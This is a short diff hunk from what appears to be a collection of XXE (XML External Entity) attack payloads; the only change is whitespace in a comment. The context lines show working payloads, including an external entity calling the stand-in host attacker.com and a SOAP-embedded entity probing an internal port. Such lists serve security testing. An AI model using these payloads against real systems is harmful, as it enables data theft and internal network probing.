@@ -40,7 +40,7 @@ http://www.xmlvalidation.com/index.php
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/blah" > ]><tag>&xxe;</tag>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://../"> %xxe;]>
 
-#  XXE inside a SOAP node (https://twitter.com/Agarri_FR/status/656440244116574208)
+# XXE inside a SOAP node (https://twitter.com/Agarri_FR/status/656440244116574208)
 <soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://0x0:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
 
 # Zend Framework (patched in versions 1.11.12 and 1.12.0 of Zend Framework)
